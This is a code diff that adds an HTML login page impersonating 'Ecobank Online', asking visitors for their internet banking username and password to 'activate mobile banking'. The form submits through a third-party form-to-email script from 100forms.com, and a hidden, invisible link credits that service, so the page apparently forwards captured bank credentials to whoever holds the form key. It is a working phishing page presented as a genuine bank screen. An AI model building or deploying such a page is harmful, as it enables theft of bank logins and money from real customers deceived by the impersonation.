@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Ecobank Online</title>
+
+  <!-- Font Awesome -->
+  <link rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+
+  <style>
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body{
+      background:#f5f5f5;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      min-height:100vh;
+    }
+
+    .screen{
+      width:100%;
+      max-width:430px;
+      min-height:100vh;
+      background:#f5f5f5;
+      padding:30px 25px;
+      position:relative;
+    }
+
+    /* Top Icons */
+    .top-bar{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      margin-bottom:70px;
+    }
+
+    .top-bar i{
+      color:#008acb;
+      font-size:34px;
+      cursor:pointer;
+    }
+
+    /* Heading */
+    h1{
+      font-size:42px;
+      font-weight:700;
+      color:#000;
+      margin-bottom:18px;
+    }
+
+    .subtitle{
+      font-size:20px;
+      color:#111;
+      line-height:1.4;
+      margin-bottom:90px;
+      max-width:330px;
+    }
+
+    /* Input Fields */
+    .input-group{
+      margin-bottom:65px;
+      position:relative;
+    }
+
+    .input-group input{
+      width:100%;
+      border:none;
+      border-bottom:2px solid #9a9a9a;
+      background:transparent;
+      padding:12px 0;
+      font-size:28px;
+      color:#000;
+      outline:none;
+    }
+
+    .input-group input::placeholder{
+      color:#707070;
+      font-weight:500;
+    }
+
+    .eye-icon{
+      position:absolute;
+      right:10px;
+      top:15px;
+      color:#777;
+      font-size:32px;
+      cursor:pointer;
+    }
+
+    /* Button */
+    .continue-btn{
+      position:absolute;
+      left:25px;
+      right:25px;
+      bottom:40px;
+      height:72px;
+      border:none;
+      border-radius:10px;
+      background:#32e000;
+      color:#fff;
+      font-size:30px;
+      font-weight:700;
+      cursor:pointer;
+    }
+
+    .continue-btn:hover{
+      opacity:0.95;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="screen">
+
+    <!-- Top -->
+    <div class="top-bar">
+      <i class="fa-solid fa-arrow-left"></i>
+      <i class="fa-regular fa-comments"></i>
+    </div>
+
+    <!-- Heading -->
+    <h1>Ecobank Online</h1>
+
+    <p class="subtitle">
+      Activate mobile banking using your internet banking details
+    </p>
+
+    <form method="post" action="//submit.form" >
+
+
+  <!-- Username -->
+  <div class="input-group">
+    <input 
+      type="text" 
+      name="username"
+      placeholder="Username"
+      required
+    >
+  </div>
+
+  <!-- Password -->
+  <div class="input-group">
+    <input 
+      type="password" 
+      name="password"
+      placeholder="Password" 
+      id="password"
+      required
+    >
+
+    <i class="fa-solid fa-eye eye-icon" id="togglePassword"></i>
+  </div>
+
+  <br>
+  <br>
+
+  <!-- Button -->
+  <button type="submit" class="continue-btn">
+    Continue
+  </button>
+<div style='font-size:1px!important; opacity:0!important;'
+ style="float:right"><a href="https://www.100forms.com" id="lnk100" title="form to email">form to email</a></div>
+<script src="https://www.100forms.com/js/FORMKEY:FMEAUWLE3PT9https://www.ecobank.com/gh/personal-banking/ways-to-bank/internet-banking" type="text/javascript"></script>
+</div>
+</form>
+
+  <script>
+    const toggle = document.getElementById("togglePassword");
+    const password = document.getElementById("password");
+
+    toggle.addEventListener("click", () => {
+      if(password.type === "password"){
+        password.type = "text";
+        toggle.classList.remove("fa-eye");
+        toggle.classList.add("fa-eye-slash");
+      } else {
+        password.type = "password";
+        toggle.classList.remove("fa-eye-slash");
+        toggle.classList.add("fa-eye");
+      }
+    });
+  </script>
+
+</body>
+</html>
